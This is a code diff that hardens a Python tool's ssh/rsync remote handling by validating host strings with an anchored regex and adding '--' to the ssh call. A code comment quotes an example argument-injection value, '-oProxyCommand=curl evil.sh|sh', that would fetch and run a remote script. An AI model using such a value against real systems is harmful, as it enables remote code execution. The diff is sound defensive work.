@@ -46,6 +46,7 @@ dependencies read by arbitrary orchestration code (a `StepRef`/
 from __future__ import annotations
 
 import ast
+import re
 import shlex
 import subprocess
 import time
@@ -71,13 +72,34 @@ class RemoteSpec:
     path: str
 
 
+# A `[user@]hostname` we are willing to hand to ssh/rsync as a bare argv
+# element. Deliberately strict, and deliberately anchored so it cannot start
+# with `-`: `subprocess.run(["ssh", host, ...])` passes `host` positionally,
+# so a "host" like `-oProxyCommand=curl evil.sh|sh` would be read by ssh as
+# an *option* and execute. The same argument applies to rsync's
+# `host:path` destination. Config-sourced rather than attacker-sourced in
+# the normal case, but the check is free and the failure mode is not.
+_SAFE_HOST = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9._-]*(@[A-Za-z0-9_][A-Za-z0-9._:-]*)?$")
+
+
 def parse_remote(spec: str) -> RemoteSpec:
-    """Parse 'user@host:/path' (or 'host:/path') into a RemoteSpec."""
+    """Parse 'user@host:/path' (or 'host:/path') into a RemoteSpec.
+
+    Raises:
+        ValueError: If `spec` isn't in `[user@]host:/path` form, or the host
+            part isn't a plain `[user@]hostname` (see `_SAFE_HOST`).
+    """
     if ":" not in spec:
         raise ValueError(f"--remote must be 'user@host:/path' (or 'host:/path'), got {spec!r}")
     host, path = spec.split(":", 1)
     if not host or not path:
         raise ValueError(f"--remote must be 'user@host:/path' (or 'host:/path'), got {spec!r}")
+    if not _SAFE_HOST.match(host):
+        raise ValueError(
+            f"--remote host {host!r} is not a plain [user@]hostname -- ssh and rsync take it "
+            "as a positional argument, so anything option-shaped (a leading '-') or otherwise "
+            "exotic is refused rather than passed through"
+        )
     return RemoteSpec(host=host, path=path)
 
 
@@ -251,7 +273,10 @@ def _ssh(host: str, command: str) -> subprocess.CompletedProcess:
     nothing else to join it with, ssh can't corrupt the quoting.
     """
     full = f"bash -lc {shlex.quote(command)}"
-    return subprocess.run(["ssh", host, full], capture_output=True, text=True)
+    # `--` ends ssh's own option parsing, so `host` can only ever be read as
+    # the destination. `parse_remote` already refuses an option-shaped host;
+    # this is the second, free layer.
+    return subprocess.run(["ssh", "--", host, full], capture_output=True, text=True)
 
 
 def sync_to_remote(base_dir: Path, rel_paths: list[Path], remote: RemoteSpec) -> None:
